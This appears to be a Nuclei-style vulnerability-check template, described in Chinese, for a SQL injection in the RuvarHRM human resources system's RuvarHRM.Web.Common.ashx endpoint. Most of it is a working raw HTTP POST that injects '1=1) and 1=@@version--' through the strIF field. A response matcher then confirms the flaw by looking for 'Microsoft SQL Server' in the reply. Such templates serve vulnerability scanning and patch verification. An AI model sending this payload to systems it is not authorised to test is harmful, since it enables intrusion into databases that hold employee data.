id: ruvarhrm-ajaxpro-sqli
info:
  name: 璐华 RuvarHRM.Web.Common.ashx SQL注入漏洞
  author: leadlife
  severity: high
  description: 在RuvarHRM人力资源管理系统特定版本的RuvarHRM.Web.Common.ashx接口中，发现一处严重的SQL注入漏洞。该接口由于未对用户输入的参数进行充分的过滤、转义或使用安全的参数化查询，攻击者可通过构造特定的恶意payload，直接操纵后台数据库查询语句，从而可能导致数据库敏感信息泄露、数据被篡改、甚至是服务器被远程控制等严重后果。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/uxhxqn1gbki24df1
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: sqli,ruvarhrm

http:
  - raw:
      - |
        POST /ajaxpro/RuvarHRM.Web.Common.get_account_by_tree,RuvarHRM.Web.Common.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        X-Ajaxpro-Method: SearchUsers

        {"strIF":"1=1) and 1=@@version--","deptPv":"0","strUserType":"all"}
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'Microsoft SQL Server')
        condition: and